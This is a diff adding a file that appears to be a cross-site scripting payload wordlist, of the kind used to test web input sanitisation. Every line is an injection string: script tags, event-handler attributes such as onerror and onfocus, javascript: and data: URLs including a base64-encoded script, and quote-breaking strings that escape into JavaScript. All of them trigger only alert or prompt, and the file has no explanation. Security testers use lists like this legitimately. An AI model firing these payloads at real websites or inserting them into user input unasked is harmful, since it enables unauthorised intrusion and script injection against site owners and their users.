@@ -1,0 +1,30 @@
+'>
+">
+<img src=x>
+<script>alert(1)</script>
+<script>alert("XSS")</script>
+"><img src="x"/>
+"><script>alert(1)</script>
+"><h1 onclick="alert(1)">Click Me</h1>
+" onclick="alert(1)">
+" onclick=alert(1)>
+<img src="x" onerror="alert(1)">
+<input onfocus=alert(1)>
+<input onfocus=alert(1) autofocus>
+" onfocus=alert(1) autofocus>
+<form action="javascript:alert(1)"><button>CLICK</button></form>
+<form><button formaction="javascript:alert(1)">CLICK</button></form>
+<form><input type="submit" value="CLICK" formaction="javascript:alert(1)"></form>
+<a href="javascript:alert(123)">CLICK</a>
+<iframe onload="alert(1)"></iframe>
+<iframe src="javascript:alert('XSS');"></iframe>
+<iframe src="data:text/html,%3Cscript%3Ealert(%22X%22)%3C%2Fscript%3E"></iframe>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxMjMpPC9zY3JpcHQ+"></object>
+
+'-prompt()-'
+"-alert(111)-"
+"+alert(111)+"
+";alert(123);a="
+";alert(123);//
+",alert('XSS')//
+";a=alert;a('XSS');//
